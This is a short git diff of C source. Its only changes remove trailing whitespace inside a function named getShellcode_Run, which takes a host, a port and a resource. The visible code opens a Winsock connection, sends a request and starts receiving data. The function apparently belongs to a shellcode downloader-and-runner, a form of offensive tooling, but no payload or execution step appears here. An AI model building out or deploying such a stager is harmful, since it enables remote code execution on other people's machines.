@@ -124,7 +124,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     int iResult;
     int recvbuflen = DEFAULT_BUFLEN;
 
-    
+
     // Initialize Winsock
     iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
     if (iResult != 0) {
@@ -186,7 +186,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     }
 
     printf("\n[+] Sent %ld Bytes\n", iResult);
-    
+
     // shutdown the connection since no more data will be sent
     iResult = shutdown(ConnectSocket, SD_SEND);
     if (iResult == SOCKET_ERROR) {
@@ -195,7 +195,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         WSACleanup();
         return ;
     }
-    
+
     // Receive until the peer closes the connection
     do {
 
